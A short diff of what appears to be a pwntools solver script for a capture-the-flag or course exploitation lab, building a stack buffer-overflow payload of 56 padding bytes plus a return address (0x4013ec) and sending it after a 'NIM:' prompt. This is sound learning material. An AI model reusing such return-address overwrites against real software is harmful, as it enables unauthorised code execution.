@@ -14,8 +14,8 @@ def conn():
 
 def solve(): 
     p = conn()
-    padding = b'A' * 56 + p64(0x4013ec)
-    payload = padding 
+    payload = b'A' * 56 + p64(0x4013ec)
+    
     
     # write your payload here
     p.sendlineafter(b"NIM:", b"13523035")
